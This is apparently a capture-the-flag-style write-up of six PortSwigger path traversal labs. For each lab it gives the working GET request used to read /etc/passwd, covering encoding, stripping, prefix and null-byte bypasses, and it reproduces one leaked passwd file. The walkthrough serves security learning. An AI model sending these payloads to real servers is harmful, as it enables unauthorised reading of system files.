# Directory Traversal

### :material-gauge-empty: File path traversal, simple case

!!! question
    This lab contains a file path traversal vulnerability in the display of product images.

    To solve the lab, retrieve the contents of the `/etc/passwd` file.

!!! tip
    I tried to solve this using just a browser, but was unsuccessful. Primarily because the content type of the return is `image/jpeg` and since I'm pulling text (the `/etc/passwd` file), it simply doesn't render properly in the chrome developer tools. NTS: use the tool.

Poking around a bit and found that the site dynamically loads images using the following structure:

```text
https://ac101fa61fd2a9cdc02e17a800950081.web-security-academy.net/image?filename=37.jpg
```

I simply found this request in the Burp Suite proxy, forwarded it to the repeater tool and edited the `filename` parameter to be `image?filename=../../../etc/passwd` and then sent the request. The response looked like the following:

```text
HTTP/1.1 200 OK
Content-Type: image/jpeg
Connection: close
Content-Length: 1260

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/home/academy:/bin/bash
dnsmasq:x:101:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
messagebus:x:102:101::/nonexistent:/usr/sbin/nologin
```

### :material-gauge: File path traversal, traversal sequences blocked with absolute path bypass

!!! question
    This lab contains a file path traversal vulnerability in the display of product images.

    The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.

    To solve the lab, retrieve the contents of the `/etc/passwd` file.

This one was pretty easy. Given a request like the following:

```text
GET /image?filename=48.jpg HTTP/1.1
```

I confirmed that it didn't work the "easy way" by testing this:

```text
GET /image?filename=../../../etc/passwd HTTP/1.1
```

And received an error indicating the requested file did not exist. So, following the instructions, I adjusted the request as follows:

```text
GET /image?filename=/etc/passwd HTTP/1.1
```

And was rewarded with the contents of the `/etc/passwd` file.


### :material-gauge: File path traversal, traversal sequences stripped non-recursively

!!! question
    This lab contains a file path traversal vulnerability in the display of product images.

    The application strips path traversal sequences from the user-supplied filename before using it.

    To solve the lab, retrieve the contents of the `/etc/passwd` file.

The key to solving this lab is that the server-side code appears to be looking for instances of `../` and stripping them, but _non-recursively_. This means, that they might have a line that looks like the following bit of python:

```python
safe_path = requested_path.replace("../", "")
```

If you provide a request that looks like this: `/image?filename=....//....//....//etc/passwd`, the value of `safe_path` still has a traversal problem, which means we will still get the file we are looking for which, is in fact, the case here.

### :material-gauge: File path traversal, traversal sequences stripped with superfluous URL-decode

!!! question
    This lab contains a file path traversal vulnerability in the display of product images.

    The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

    To solve the lab, retrieve the contents of the `/etc/passwd` file.

On this one, I tried URL-encoding the traversal attack as follows:

```text
GET /image?filename=%2E%2E%2f%2E%2E%2f%2E%2E%2fetc%2fpasswd HTTP/1.1
```

You see that each `.` becomes `%2e` and each `/` becomes `%2f`. But this didn't work. I then tried *double* URL encoding the path as shown below, which **did** work.

```text
GET /image?filename=%252E%252E%252f%252E%252E%252f%252E%252E%252fetc%252fpasswd HTTP/1.1
```

The problem or *bug* in this application is that they called a "safe" function (URL-decode) twice... once prior to checking for path traversal issues (a good thing) but a second time *after* checking for path traversal issues. This could almost be considered a TOCTOU type bug.


### :material-gauge: File path traversal, validation of start of path

!!! question
    This lab contains a file path traversal vulnerability in the display of product images.

    The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.

    To solve the lab, retrieve the contents of the `/etc/passwd` file.

Within the HTTP request log, I found a request that looks like this:

```text
GET /image?filename=/var/www/images/47.jpg HTTP/1.1
```

I modified it as follows:

```text
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
```

After submission, I was presented the `/etc/passwd` file.


### :material-gauge: File path traversal, validation of file extension with null byte bypass

!!! question
    This lab contains a file path traversal vulnerability in the display of product images.

    The application validates that the supplied filename ends with the expected file extension.

    To solve the lab, retrieve the contents of the `/etc/passwd` file.

If you take the time to [read the documentation](https://portswigger.net/web-security/file-path-traversal) on this type of issue, the solution becomes quite straight forward. The following `GET` request does the trick:

```text
GET /image?filename=../../../etc/passwd%00.jpg HTTP/1.1
```